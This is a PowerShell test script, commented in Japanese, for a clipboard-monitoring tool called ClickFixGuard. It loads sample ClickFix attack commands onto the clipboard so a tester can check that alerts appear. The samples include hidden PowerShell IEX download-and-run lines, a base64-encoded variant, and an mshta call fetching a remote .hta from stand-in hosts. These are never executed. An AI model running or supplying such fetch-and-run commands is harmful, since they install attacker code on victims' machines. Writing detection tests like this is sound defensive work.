# ClickFixGuard テストスクリプト
# クリップボードに典型的なClickFix攻撃コマンドをセットして検知を確認する

Write-Host "=== ClickFixGuard Test ===" -ForegroundColor Cyan
Write-Host ""

# Test 1: Critical - PowerShell IEX (最も一般的なClickFix攻撃)
Write-Host "[Test 1] Critical: PowerShell IEX command" -ForegroundColor Red
Set-Clipboard -Value 'powershell -WindowStyle Hidden IEX(Invoke-WebRequest "https://evil.example.com/payload.ps1")'
Write-Host "  Clipboard set. Check if tray notification appears..." -ForegroundColor Yellow
Write-Host "  Press Enter to continue to next test..."
Read-Host

# Test 2: Critical - mshta remote (Phantom Meet pattern)
Write-Host "[Test 2] Critical: mshta remote execution" -ForegroundColor Red
Set-Clipboard -Value 'mshta https://malicious.example.com/app.hta'
Write-Host "  Clipboard set. Check if tray notification appears..." -ForegroundColor Yellow
Write-Host "  Press Enter to continue..."
Read-Host

# Test 3: Critical - Base64 encoded PowerShell
Write-Host "[Test 3] Critical: Base64 encoded PowerShell" -ForegroundColor Red
Set-Clipboard -Value 'powershell -enc SQBFAFgAKABJAFcAUgAgACcAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBzAGgAZQBsAGwAJwApAA=='
Write-Host "  Clipboard set. Check if tray notification appears..." -ForegroundColor Yellow
Write-Host "  Press Enter to continue..."
Read-Host

# Test 4: Suspicious - cmd /c
Write-Host "[Test 4] Suspicious: cmd /c" -ForegroundColor DarkYellow
Set-Clipboard -Value 'cmd /c echo test'
Write-Host "  Clipboard set. Check if tray notification appears (yellow)..." -ForegroundColor Yellow
Write-Host "  Press Enter to continue..."
Read-Host

# Test 5: Safe - normal text
Write-Host "[Test 5] Safe: normal clipboard text" -ForegroundColor Green
Set-Clipboard -Value 'Hello, this is just normal text.'
Write-Host "  Clipboard set. Should show NO notification." -ForegroundColor Green
Write-Host "  Press Enter to finish..."
Read-Host

Write-Host ""
Write-Host "=== Test Complete ===" -ForegroundColor Cyan
Write-Host "If you saw notifications for Tests 1-3 (Critical) and Test 4 (Suspicious),"
Write-Host "but NOT for Test 5, then ClickFixGuard is working correctly!"
